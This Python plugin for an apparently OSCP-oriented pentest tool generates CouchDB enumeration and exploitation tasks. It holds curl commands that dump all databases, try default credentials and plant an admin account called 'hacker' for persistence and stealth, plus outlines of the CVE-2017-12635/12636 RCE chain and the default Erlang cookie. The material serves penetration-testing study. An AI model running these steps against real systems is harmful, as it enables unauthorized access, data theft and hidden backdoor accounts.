"""
CouchDB NoSQL database service enumeration plugin

Generates tasks for CouchDB enumeration including:
- Database listing (couchdb-databases NSE script)
- Server statistics (couchdb-stats)
- Admin Party detection (no authentication)
- Futon web UI check
- REST API enumeration

Extracted from: Nmap Cookbook Chapter 5 - Auditing Databases
Generated by: CrackPot v1.0
Date: 2025-10-08
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class CouchDBPlugin(ServicePlugin):
    """CouchDB NoSQL database enumeration plugin"""

    @property
    def name(self) -> str:
        return "couchdb"

    @property
    def default_ports(self) -> List[int]:
        return [5984, 6984]

    @property
    def service_names(self) -> List[str]:
        return ['couchdb', 'couch']

    def detect(self, port_info: Dict[str, Any], profile: 'TargetProfile') -> bool:
        """Detect CouchDB services"""
        service = port_info.get('service', '').lower()
        port = port_info.get('port')

        # Check service name
        if any(svc in service for svc in self.service_names):
            return True

        # Check common ports
        if port in self.default_ports:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate CouchDB enumeration task tree"""
        version = service_info.get('version', '')
        product = service_info.get('product', 'Apache CouchDB')

        tasks = {
            'id': f'couchdb-enum-{port}',
            'name': f'CouchDB Enumeration (Port {port})',
            'type': 'parent',
            'children': []
        }

        # TASK 1: NSE Enumeration
        tasks['children'].append({
            'id': f'couchdb-nse-enum-{port}',
            'name': 'CouchDB NSE Enumeration',
            'type': 'command',
            'metadata': {
                'command': f'nmap -p{port} --script couchdb-databases,couchdb-stats {target}',
                'description': 'Enumerate CouchDB databases and retrieve server statistics via NSE scripts',
                'tags': ['OSCP:LOW', 'COUCHDB', 'NOSQL', 'QUICK_WIN', 'AUTOMATED'],
                'flag_explanations': {
                    '--script couchdb-databases': 'List all databases via /_all_dbs API endpoint',
                    '--script couchdb-stats': 'Retrieve runtime statistics (requests, status codes, authentication status)',
                    '-p': f'Target port ({port})'
                },
                'success_indicators': [
                    'Database list retrieved via /_all_dbs',
                    'Statistics show "admin party" mode (no authentication enabled)',
                    'HTTP status codes reveal activity patterns',
                    'Server version identified',
                    'No authentication required (misconfiguration - CRITICAL finding)'
                ],
                'failure_indicators': [
                    'Authentication required (401 Unauthorized)',
                    'Connection refused',
                    'Empty database list (no access)',
                    'Admin party disabled (secure configuration)'
                ],
                'next_steps': [
                    'If admin party detected (no auth):',
                    '  - Access Futon web UI: http://{target}:{port}/_utils/',
                    '  - List databases: curl http://{target}:{port}/_all_dbs',
                    '  - Create admin user for persistence',
                    '  - Extract all database contents',
                    '',
                    'If authentication required:',
                    '  - Try default credentials: admin:admin, couchdb:couchdb',
                    '  - Check for CVEs in detected version',
                    '  - Test for REST API vulnerabilities'
                ],
                'alternatives': [
                    f'Manual REST API test: curl http://{target}:{port}/_all_dbs',
                    f'Check Futon UI: http://{target}:{port}/_utils/',
                    f'Server info: curl http://{target}:{port}/',
                    f'Stats: curl http://{target}:{port}/_stats',
                    f'Active tasks: curl http://{target}:{port}/_active_tasks'
                ],
                'notes': 'CRITICAL: CouchDB "Admin Party" = no authentication (default in versions < 3.0). This is a QUICK WIN - always test for no-auth access first. CouchDB is HTTP-based (RESTful JSON API). Futon = web-based admin interface. Save with -oA for OSCP documentation. Time estimate: 1-2 minutes.'
            }
        })

        # TASK 2: Manual REST API Enumeration
        tasks['children'].append({
            'id': f'couchdb-rest-enum-{port}',
            'name': 'Manual REST API Enumeration',
            'type': 'parent',
            'children': [
                {
                    'id': f'couchdb-server-info-{port}',
                    'name': 'CouchDB Server Information',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -s http://{target}:{port}/',
                        'description': 'Get CouchDB server information (version, vendor, welcome message)',
                        'tags': ['MANUAL', 'OSCP:HIGH', 'COUCHDB', 'QUICK_WIN'],
                        'flag_explanations': {
                            '-s': 'Silent mode (no progress bar)',
                            '/': 'Root endpoint (returns server info JSON)'
                        },
                        'success_indicators': [
                            'JSON response with couchdb, version, vendor fields',
                            '"Welcome":"Welcome to Apache CouchDB"',
                            'Version number disclosed'
                        ],
                        'failure_indicators': [
                            'Connection refused',
                            'HTTP 401 Unauthorized (auth required for root)',
                            'Empty response or error'
                        ],
                        'next_steps': [
                            'Note CouchDB version for CVE research',
                            'Proceed to database enumeration',
                            'Check for Futon web interface'
                        ],
                        'alternatives': [
                            f'Browser: http://{target}:{port}/',
                            f'Netcat: echo -e "GET / HTTP/1.0\\r\\n\\r\\n" | nc {target} {port}'
                        ],
                        'notes': 'Root endpoint often accessible without authentication. Version disclosure useful for exploit research.'
                    }
                },
                {
                    'id': f'couchdb-list-dbs-{port}',
                    'name': 'List All Databases',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -s http://{target}:{port}/_all_dbs',
                        'description': 'List all databases via /_all_dbs API endpoint',
                        'tags': ['MANUAL', 'OSCP:HIGH', 'COUCHDB'],
                        'flag_explanations': {
                            '/_all_dbs': 'API endpoint to list database names (JSON array)'
                        },
                        'success_indicators': [
                            'JSON array of database names returned',
                            'Database names visible: ["_replicator","_users","myapp"]',
                            'No authentication required'
                        ],
                        'failure_indicators': [
                            'HTTP 401 Unauthorized (auth required)',
                            'Empty array [] (no databases)',
                            'Error response'
                        ],
                        'next_steps': [
                            'For each database, get info: curl http://{target}:{port}/<db_name>',
                            'List documents in database: curl http://{target}:{port}/<db_name>/_all_docs',
                            'Focus on application databases (not _replicator, _users)',
                            'Extract document contents'
                        ],
                        'alternatives': [
                            f'Browser: http://{target}:{port}/_all_dbs',
                            'Futon UI database listing',
                            'Python: requests.get(f"http://{target}:{port}/_all_dbs").json()'
                        ],
                        'notes': 'Default databases: _replicator (replication config), _users (user accounts). Focus on custom application databases.'
                    }
                },
                {
                    'id': f'couchdb-enum-db-{port}',
                    'name': 'Enumerate Database Contents',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Extract documents and data from CouchDB databases',
                        'tags': ['MANUAL', 'OSCP:HIGH', 'COUCHDB'],
                        'command': f'curl -s http://{target}:{port}/<database>/_all_docs',
                        'next_steps': [
                            'CouchDB REST API Enumeration Workflow:',
                            '',
                            '1. List all databases:',
                            f'   curl http://{target}:{port}/_all_dbs',
                            '',
                            '2. Get database information:',
                            f'   curl http://{target}:{port}/<database>',
                            '   (Returns: doc_count, disk_size, data_size)',
                            '',
                            '3. List all documents in database:',
                            f'   curl http://{target}:{port}/<database>/_all_docs',
                            '   (Returns: doc IDs and revisions)',
                            '',
                            '4. Retrieve specific document:',
                            f'   curl http://{target}:{port}/<database>/<doc_id>',
                            '   (Returns: full document JSON)',
                            '',
                            '5. Retrieve document with attachments:',
                            f'   curl http://{target}:{port}/<database>/<doc_id>?attachments=true',
                            '',
                            '6. Query documents (using views):',
                            f'   curl http://{target}:{port}/<database>/_design/<design_doc>/_view/<view_name>',
                            '',
                            '7. Bulk retrieve all documents:',
                            f'   curl http://{target}:{port}/<database>/_all_docs?include_docs=true',
                            '',
                            '8. Export database to file:',
                            '   curl -X GET http://{target}:{port}/<database>/_all_docs?include_docs=true > dump.json',
                            '',
                            '9. Search for credentials:',
                            '   - Look for password, apikey, token fields',
                            '   - Check _users database for account info',
                            '   - Extract admin credentials for persistence'
                        ],
                        'alternatives': [
                            'Futon web UI: Browse databases visually',
                            'couchdb-dump: python couchdb-dump.py --host {target} --port {port} --db <database>',
                            'Bulk export: couchdb-replicate to local instance',
                            'Python script with requests library'
                        ],
                        'notes': 'CouchDB documents are JSON objects with _id and _rev fields. _users database contains hashed passwords (pbkdf2). Attachments are binary files stored with documents. Document OSCP queries and responses.'
                    }
                }
            ]
        })

        # TASK 3: Futon Web Interface
        tasks['children'].append({
            'id': f'couchdb-futon-{port}',
            'name': 'Futon Web Admin Interface',
            'type': 'command',
            'metadata': {
                'command': f'curl -s http://{target}:{port}/_utils/ | head -20',
                'description': 'Check if Futon web-based admin interface is accessible',
                'tags': ['OSCP:HIGH', 'COUCHDB', 'WEB', 'QUICK_WIN'],
                'flag_explanations': {
                    '/_utils/': 'Futon admin interface base URL',
                    'head -20': 'Show first 20 lines of HTML response'
                },
                'success_indicators': [
                    'HTTP 200 OK response',
                    'Futon HTML interface returned',
                    'Admin interface accessible without authentication'
                ],
                'failure_indicators': [
                    'HTTP 404 Not Found (Futon disabled)',
                    'HTTP 401 Unauthorized (auth required)',
                    'Connection refused'
                ],
                'next_steps': [
                    f'Open in browser: http://{target}:{port}/_utils/',
                    'Futon interface provides:',
                    '  - Visual database browsing',
                    '  - Document creation/editing',
                    '  - User management (if admin party)',
                    '  - Configuration viewer',
                    '  - Replication setup',
                    '',
                    'If admin party mode:',
                    '  - Create admin user for persistence',
                    '  - Browse all databases visually',
                    '  - Download database backups',
                    '  - Modify critical documents'
                ],
                'alternatives': [
                    f'Browser: http://{target}:{port}/_utils/',
                    f'Check alternative: http://{target}:{port}/_utils/index.html',
                    'Newer CouchDB uses Fauxton instead of Futon'
                ],
                'notes': 'Futon = legacy web UI (CouchDB < 2.0). Fauxton = modern UI (CouchDB 2.0+). Both provide full admin capabilities if admin party enabled. OSCP: Document Futon access in report screenshots.'
            }
        })

        # TASK 4: Admin Party Exploitation
        tasks['children'].append({
            'id': f'couchdb-admin-party-{port}',
            'name': 'Admin Party Exploitation',
            'type': 'parent',
            'children': [
                {
                    'id': f'couchdb-check-admin-party-{port}',
                    'name': 'Check Admin Party Status',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -s http://{target}:{port}/_config/admins',
                        'description': 'Check if CouchDB is in Admin Party mode (no admin users configured)',
                        'tags': ['MANUAL', 'OSCP:HIGH', 'COUCHDB', 'QUICK_WIN'],
                        'flag_explanations': {
                            '/_config/admins': 'API endpoint to list admin users (requires admin or admin party)'
                        },
                        'success_indicators': [
                            'Empty JSON object {} (no admins = admin party enabled)',
                            'No authentication required to access endpoint'
                        ],
                        'failure_indicators': [
                            'HTTP 401 Unauthorized (admin party disabled)',
                            'Admin users listed (admin party ended)'
                        ],
                        'next_steps': [
                            'If admin party enabled:',
                            '  - Full admin access without credentials',
                            '  - Create admin user for persistence',
                            '  - Extract all data',
                            '  - Modify configurations',
                            '',
                            'If admin party disabled:',
                            '  - Try default credentials',
                            '  - Exploit version-specific CVEs'
                        ],
                        'alternatives': [
                            f'Check via Futon: http://{target}:{port}/_utils/#_config/admins',
                            'Attempt admin operations to confirm status'
                        ],
                        'notes': 'Admin Party = ALL users have admin privileges. Default in CouchDB < 3.0. CRITICAL misconfiguration.'
                    }
                },
                {
                    'id': f'couchdb-create-admin-{port}',
                    'name': 'Create Admin User (Persistence)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Create persistent admin account in CouchDB (requires admin party or existing admin access)',
                        'tags': ['MANUAL', 'OSCP:MEDIUM', 'COUCHDB', 'PERSISTENCE'],
                        'command': f'curl -X PUT http://{target}:{port}/_config/admins/hacker -d \'"password123"\'',
                        'flag_explanations': {
                            '-X PUT': 'HTTP PUT method (create/update resource)',
                            '/_config/admins/hacker': 'Create admin user named "hacker"',
                            '-d \'"password123"\'': 'Password (CouchDB auto-hashes with pbkdf2)'
                        },
                        'success_indicators': [
                            'HTTP 200 OK response',
                            'Empty string "" returned (success)',
                            'Admin user created'
                        ],
                        'failure_indicators': [
                            'HTTP 401 Unauthorized (need admin access)',
                            'Error response'
                        ],
                        'next_steps': [
                            'Verify admin user created:',
                            f'  curl http://{target}:{port}/_config/admins',
                            '',
                            'Authenticate with new admin:',
                            f'  curl -u hacker:password123 http://{target}:{port}/_all_dbs',
                            '',
                            'End admin party (if desired for stealth):',
                            '  - Creating first admin automatically ends admin party',
                            '  - Regular users lose admin privileges',
                            '',
                            'Maintain access:',
                            '  - Document credentials for OSCP report',
                            '  - Create multiple admin accounts for redundancy',
                            '  - Extract critical data before ending admin party'
                        ],
                        'alternatives': [
                            'Via Futon UI: Click "Create Admin" button',
                            'Python: requests.put(url, data=\'"password"\')',
                            'Add to local.ini config file (requires file system access)'
                        ],
                        'notes': 'OSCP: Creating admin user demonstrates exploitation of admin party. Password is automatically hashed. Document exact curl command for report.'
                    }
                }
            ]
        })

        # TASK 5: Authentication Testing (if not admin party)
        tasks['children'].append({
            'id': f'couchdb-auth-test-{port}',
            'name': 'Authentication Testing',
            'type': 'manual',
            'metadata': {
                'description': 'Test CouchDB authentication with default credentials',
                'tags': ['MANUAL', 'OSCP:LOW', 'COUCHDB'],
                'command': f'curl -u admin:admin http://{target}:{port}/_all_dbs',
                'next_steps': [
                    'Try default credentials:',
                    f'  curl -u admin:admin http://{target}:{port}/_all_dbs',
                    f'  curl -u couchdb:couchdb http://{target}:{port}/_all_dbs',
                    f'  curl -u root:root http://{target}:{port}/_all_dbs',
                    '',
                    'If authentication fails:',
                    '  - Focus on no-auth endpoints (/_all_dbs may still work)',
                    '  - Research version-specific CVEs',
                    '  - Check for Erlang cookie exposure',
                    '  - Test for REST API injection vulnerabilities'
                ],
                'alternatives': [
                    'Hydra brute-force (if wordlist available)',
                    'Metasploit: auxiliary/scanner/couchdb/couchdb_login (if module exists)',
                    'Custom Python brute-force script'
                ],
                'notes': 'Authentication rarely needed if admin party enabled. Focus on no-auth access first.'
            }
        })

        # TASK 6: Exploitation Resources
        tasks['children'].append({
            'id': f'couchdb-exploit-{port}',
            'name': 'CouchDB Exploitation Resources',
            'type': 'manual',
            'metadata': {
                'description': 'CouchDB-specific exploitation techniques and known vulnerabilities',
                'tags': ['COUCHDB', 'RESEARCH', 'OSCP:LOW'],
                'next_steps': [
                    'CouchDB Exploitation Vectors:',
                    '',
                    '1. Admin Party (most common):',
                    '   - Full admin access without credentials',
                    '   - Create admin user for persistence',
                    '   - Extract all database contents',
                    '   - Modify configurations',
                    '',
                    '2. CVE-2017-12635: Privilege Escalation',
                    '   - Create admin user via malformed JSON',
                    '   - Affects CouchDB 1.7.0, 2.0.0',
                    '   - Exploit: PUT /_users/org.couchdb.user:hacker with roles:["_admin"]',
                    '',
                    '3. CVE-2017-12636: RCE via query_server config',
                    '   - Execute arbitrary commands as CouchDB user',
                    '   - Requires admin access (often via CVE-2017-12635)',
                    '   - PUT /_config/query_servers/cmd with OS command',
                    '',
                    '4. Erlang Cookie Exploitation:',
                    '   - CouchDB runs on Erlang VM',
                    '   - Default cookie: monster',
                    '   - Cookie exposure allows remote code execution',
                    '',
                    '5. Replication-based attacks:',
                    '   - Setup malicious replication source',
                    '   - Replicate malicious database to target',
                    '   - Use _bulk_docs for mass document injection',
                    '',
                    '6. POST /xxx/_ensure_full_commit DoS:',
                    '   - Resource exhaustion via commit flooding'
                ],
                'alternatives': [
                    'HackTricks CouchDB: https://book.hacktricks.xyz/pentesting/5984-pentesting-couchdb',
                    'searchsploit couchdb',
                    'Metasploit: search couchdb',
                    'CouchDB Exploit Collection: https://github.com/vulhub/vulhub/tree/master/couchdb'
                ],
                'notes': 'Admin party is most common OSCP vector. CVE-2017-12635/12636 chain provides RCE on vulnerable versions. Research version-specific exploits.'
            }
        })

        # TASK 7: CVE Research (conditional on version)
        if version:
            tasks['children'].append({
                'id': f'couchdb-cve-{port}',
                'name': f'Exploit Research: CouchDB {version}',
                'type': 'parent',
                'children': [
                    {
                        'id': f'searchsploit-couchdb-{port}',
                        'name': f'SearchSploit: CouchDB {version}',
                        'type': 'command',
                        'metadata': {
                            'command': f'searchsploit couchdb {version}',
                            'description': 'Search ExploitDB for CouchDB vulnerabilities',
                            'tags': ['OSCP:MEDIUM', 'RESEARCH', 'COUCHDB'],
                            'success_indicators': [
                                'Exploits found for specific version',
                                'CVE numbers identified',
                                'RCE or privilege escalation exploits available'
                            ],
                            'next_steps': [
                                'Review exploit details: searchsploit -x <exploit_id>',
                                'Download exploit: searchsploit -m <exploit_id>',
                                'Test CVE-2017-12635 + CVE-2017-12636 chain for RCE',
                                'Check for admin party first (easier than exploits)'
                            ],
                            'alternatives': [
                                'Google: "CouchDB {version} exploit"',
                                'GitHub: Search for CouchDB PoCs',
                                'Vulhub: https://github.com/vulhub/vulhub/tree/master/couchdb'
                            ],
                            'notes': 'Key CVEs: CVE-2017-12635 (privilege escalation), CVE-2017-12636 (RCE). Versions < 2.1.0 vulnerable. Focus on admin party misconfiguration first.'
                        }
                    }
                ]
            })

        return tasks
